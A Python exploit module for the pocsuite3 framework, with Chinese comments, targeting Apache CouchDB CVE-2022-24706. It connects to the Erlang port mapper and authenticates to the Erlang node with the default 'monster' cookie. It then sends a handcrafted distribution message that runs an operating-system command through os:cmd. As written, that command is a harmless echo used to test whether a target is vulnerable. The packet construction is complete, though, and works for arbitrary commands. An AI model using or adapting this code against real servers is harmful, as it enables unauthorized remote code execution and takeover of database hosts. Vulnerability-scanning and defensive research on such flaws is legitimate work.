from collections import OrderedDict
from urllib.parse import urljoin
import re
import requests,urllib3
import urllib.request
import ssl
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
import socket
from hashlib import md5
import struct
import sys,random
import re
import time
from weakref import proxy



EPMD_PORT = 4369  # 默认的Erlang分布式端口
COOKIE = "monster"  # CouchDB的默认Erlang cookie
ERLNAG_PORT = 0
EPM_NAME_CMD = b"\x00\x01\x6e"  # 请求节点列表

# 一些数据:
NAME_MSG = b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"
CTRL_DATA = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"
class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-06-27'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-06-27'  # 编写 PoC 的日期
    updateDate = '2022-06-27'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'Apache CouchDB 代码执行漏洞(CVE-2022-24706)'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = '''3.2.1'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        由于CouchDB的默认安装配置存在缺陷，最终可导致攻击者通过访问特定端口，绕过权限校验并获得管理员权限
        CVE-2022-24706漏洞是由于3.2.2 版本之前的 CouchDB 的默认配置存在缺陷点， 攻击者可以在未进行身份验证的情况下访问不正确的默认安装进而获得管理员权限。
        该漏洞影响范围小，建议用户在所有 CouchDB 安装之前安装防火墙。
        完整的CouchDB api 在注册端口“5984”上可用，这是唯一的需要为单节点安装公开的端口。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
       
    def poc(self):
        TARGET = (self.url).split('//')[1]
        EPMD_PORT = 4369  # Default Erlang distributed port
        COOKIE = "monster"  # Default Erlang cookie for CouchDB
        ERLNAG_PORT = 0
        EPM_NAME_CMD = b"\x00\x01\x6e"  # Request for nodes list

        # Some data:
        NAME_MSG = b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
        CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"
        CTRL_DATA = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex"
        print("通过Erlang分发协议远程执行命令.")
        # 连接到EPMD:
        try:
            socket.setdefaulttimeout(5)
            epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            epm_socket.connect((TARGET, EPMD_PORT))
        except socket.error as msg:
            print("无法连接到EPMD: %s  终止程序" % msg)
            sys.exit(1)

        epm_socket.send(EPM_NAME_CMD)  # request Erlang nodes
        if epm_socket.recv(4) == b'\x00\x00\x11\x11':  # OK
            data = epm_socket.recv(1024)
            data = data[0:len(data) - 1].decode('ascii')
            data = data.split("\n")
            if len(data) == 1:
                #choise = 1
                #print(data)
                port = re.search("\d+", data[0]).group()
                ERLNAG_PORT = int(port) #端口
                print("发现 " + data[0])
            else:
                print("发现多个节点,依次尝试:")
                for line in data:
                    port = re.search("\d+", line).group()
                    #port_list.append()
                    print("尝试:"+ port + '端口')
                    ERLNAG_PORT = int(port) #端口
                    # 连接到Erlang端口:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((TARGET, ERLNAG_PORT)) 
                        break
                    except socket.error as msg:
                        print("不能连接到Erlang服务器: %s  终止程序" % msg)
                        pass
                #choise = int(input("\n> "))

        else:
            print("节点列表请求错误，正在退出")
            pass
        epm_socket.close()

        # 连接到Erlang端口:
        try:
            #print(ERLNAG_PORT)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, ERLNAG_PORT))  
        except socket.error as msg:
            print("不能连接到Erlang服务器: %s  终止程序" % msg)
            pass

        s.send(NAME_MSG)
        s.recv(5)  # Receive "ok" message
        challenge = s.recv(1024)  # Receive "challenge" message
        challenge = struct.unpack(">I", challenge[9:13])[0]

        #print("Extracted challenge: {}".format(challenge))

        # Add Challenge Digest
        CHALLENGE_REPLY += md5(bytes(COOKIE, "ascii")+ bytes(str(challenge), "ascii")).digest()
        s.send(CHALLENGE_REPLY)
        CHALLENGE_RESPONSE = s.recv(1024)

        # 编译命令
        self.num = random.randint(111111111,9999999999)
        CMD = 'echo '+str(self.num)
        MSG = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
        MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
        MSG += struct.pack(">H", len(CMD))
        MSG += bytes(CMD, 'ascii')
        MSG += b'jw\x04user'
        PAYLOAD = b'\x70' + CTRL_DATA + MSG
        PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD
        if len(CHALLENGE_RESPONSE) == 0:
            print("身份验证失败,退出")
        else:
            #print("身份验证成功")
            s.send(PAYLOAD)
            print("发送命令: '{}'".format(CMD))
            s.recv(45)  # Control message
            #print(s.recv(1024).decode()) 
            return s.recv(1024).decode()      
    def _verify(self):
        result = {}
        try:
            results =self.poc()
            print(results)
            if  str(self.num) in results:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
            return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)
